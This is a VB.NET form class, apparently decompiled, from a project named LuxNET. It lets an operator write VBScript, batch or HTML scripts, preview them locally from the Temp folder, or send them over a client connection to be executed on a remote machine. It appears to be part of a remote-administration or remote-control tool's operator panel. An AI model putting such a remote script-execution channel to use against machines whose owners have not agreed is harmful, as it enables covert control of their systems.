Imports LuxNET.My
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class Scripting
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.InitializeComponent()
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            Me.SendPacket(New Object() {CByte(&H3F), Me.rtb_vbs.Text})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub btn_test_Click(sender As Object, e As EventArgs) Handles btn_test.Click
        Try
            File.WriteAllText((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.vbs"), Me.rtb_vbs.Text)
            Process.Start((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.vbs"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            File.WriteAllText((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.bat"), Me.rtb_batch.Text)
            Process.Start((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.bat"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Me.SendPacket(New Object() {CByte(&H3E), Me.rtb_batch.Text})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Me.SendPacket(New Object() {CByte(&H3D), Me.rtb_html.Text})
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Try
            File.WriteAllText((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.html"), Me.rtb_html.Text)
            Process.Start((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\scriptingpreview.html"))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Me.ToolStripStatusLabel1.Text = exception.Message
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub

    Public client As ServerClient
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        BatchScripting = &H3E
        HTMLScripting = &H3D
        VBsScripting = &H3F
    End Enum
End Class